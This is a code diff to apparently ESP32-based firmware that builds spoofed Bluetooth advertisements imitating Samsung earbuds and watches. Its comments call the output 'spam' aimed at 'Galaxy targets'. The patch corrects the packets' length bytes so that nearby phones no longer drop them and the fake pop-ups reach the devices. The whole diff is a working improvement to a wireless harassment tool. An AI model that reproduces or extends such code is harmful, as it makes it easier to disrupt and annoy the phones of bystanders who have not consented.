@@ -245,7 +245,14 @@ static int build_apple_airtag(uint8_t *pkt)
 static int build_samsung_buds(uint8_t *pkt)
 {
     int i = 0;
-    pkt[i++] = 0x1B;       /* length 27 */
+    /* Length byte is BACKFILLED from the real body size below. It used to be
+     * hardcoded 0x1B (27) while the body is only 26 bytes, so the AD structure
+     * claimed one more byte than the advertisement actually contained. That is
+     * malformed by construction: conformant scanners drop the structure, so
+     * Galaxy targets never saw the spam -- while the on-screen counter still
+     * climbed, because it counts ble_gap_adv_set_data() accepting the buffer,
+     * not anything reaching a phone. */
+    pkt[i++] = 0x00;       /* placeholder, patched at the end */
     pkt[i++] = 0xFF;
     pkt[i++] = 0x75; pkt[i++] = 0x00;  /* Samsung */
     /* prefix block */
@@ -261,13 +268,16 @@ static int build_samsung_buds(uint8_t *pkt)
         0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00,
     };
     memcpy(pkt + i, suffix, sizeof(suffix)); i += sizeof(suffix);
+    pkt[0] = (uint8_t)(i - 1);   /* AD length excludes the length byte itself */
     return i;
 }
 
 static int build_samsung_watch(uint8_t *pkt)
 {
     int i = 0;
-    pkt[i++] = 0x0F;       /* length 15 */
+    /* Same backfill as build_samsung_buds: this declared 0x0F (15) over a
+     * 14-byte body. */
+    pkt[i++] = 0x00;       /* placeholder, patched at the end */
     pkt[i++] = 0xFF;
     pkt[i++] = 0x75; pkt[i++] = 0x00;
     static const uint8_t prefix[] = {
@@ -275,6 +285,7 @@ static int build_samsung_watch(uint8_t *pkt)
     };
     memcpy(pkt + i, prefix, sizeof(prefix)); i += sizeof(prefix);
     pkt[i++] = SAMSUNG_WATCH_DEVICES[esp_random() % SAMSUNG_WATCH_N];
+    pkt[0] = (uint8_t)(i - 1);
     return i;
 }
 
